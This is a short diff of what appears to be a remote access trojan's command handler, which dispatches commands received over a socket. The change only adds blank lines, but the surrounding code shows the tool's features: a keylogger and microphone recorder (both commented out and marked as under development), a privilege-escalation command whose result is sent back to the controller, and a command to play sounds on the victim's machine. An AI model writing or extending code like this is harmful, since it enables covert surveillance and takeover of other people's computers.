@@ -33,6 +33,7 @@ def handle_command(sock, command: str) -> bool:
         reliable_send(sock, "[!] Keylogger: feature under development\n")
     elif command == 'keylogger_stop':
         reliable_send(sock, "[!] Keylogger: feature under development\n")
+        
         """
     elif command == 'keylogger_start':
         Keylogger.start()
@@ -41,11 +42,13 @@ def handle_command(sock, command: str) -> bool:
         logs = Keylogger.stop()
         reliable_send(sock, logs)
         """
+        
     elif command == 'priv_escalate':
         res = escalate_privilege()
         reliable_send(sock, res)
     elif command.startswith('record_mic '):
         reliable_send(sock, "[!] Mic recorder: feature under development\n")
+        
         """
     elif command.startswith('record_mic '):
         duration = float(command.split(' ', 1)[1])
@@ -54,6 +57,7 @@ def handle_command(sock, command: str) -> bool:
         recorder.save('mic_record.wav')
         reliable_send(sock, "[+] Mic recording saved as mic_record.wav")
         """
+        
     elif command.startswith('play_sound '):
         path = command.split(' ', 1)[1]
         player = SoundPlayer()
